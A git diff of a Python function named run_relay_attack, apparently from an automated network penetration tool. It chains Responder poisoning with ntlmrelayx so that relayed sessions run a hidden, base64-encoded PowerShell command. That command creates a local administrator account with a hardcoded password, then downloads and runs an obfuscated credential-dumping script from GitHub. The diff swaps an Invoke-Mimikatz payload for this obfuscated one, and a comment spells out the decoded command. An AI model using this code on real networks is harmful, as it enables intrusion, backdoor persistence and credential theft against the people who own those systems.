@@ -598,38 +598,11 @@ def run_relay_attack():
     resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
     resp_proc = run_proc(resp_cmd)
 
-    # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker
-    # /add; IEX (New-Object Net.WebClient).DownloadString(
-    # 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
-    # ); Invoke-Mimikatz -DumpCreds
+# net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
     relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py'
                 ' -of ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
-                ' -c "powershell -nop -exec bypass -w hidden -enc bgBlAH'
-                'QAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAH'
-                'IAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0AC'
-                'AAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAG'
-                'EAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkAD'
-                'sAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC'
-                '4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAH'
-                'QAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAH'
-                'QAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG'
-                '8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAH'
-                'AAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8ARQB4AGYAaQBsAHQAcgBhAH'
-                'QAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAH'
-                'AAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AH'
-                'oAIAAtAEQAdQBtAHAAQwByAGUAZABzAA=="')
-#    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py'
-#                ' -of ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
-#                ' -c "powershell -nop -exec bypass -w hidden -enc SQBFAFgAIAAoAE4AZQB'
-#                '3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB'
-#                '0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB'
-#                '0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwB'
-#                'vAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbAB'
-#                'NAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB'
-#                '0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbw'
-#                'BrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbg'
-#                'B2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcg'
-#                'BlAGQAcwA="')
+                ' -c "powershell -nop -exec bypass -w hidden -enc '
+                'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
     ntlmrelay_proc = run_proc(relay_cmd)
     return ntlmrelay_proc
 
